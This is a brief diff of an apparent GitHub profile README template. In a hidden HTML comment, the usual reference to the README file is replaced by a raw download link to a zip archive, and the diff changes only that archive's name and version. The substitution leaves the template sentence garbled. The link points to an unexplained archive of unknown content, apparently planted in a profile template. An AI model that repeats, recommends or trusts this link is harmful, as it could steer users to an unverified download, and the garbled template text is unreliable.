@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-betapanda3piid/betapanda3piid is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/betapanda3piid/betapanda3piid/main/pygofer/betapanda3piid-1.5-beta.1.zip` (this file) appears on your GitHub profile.
+betapanda3piid/betapanda3piid is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/betapanda3piid/betapanda3piid/main/pygofer/betapanda-piid-3.4.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
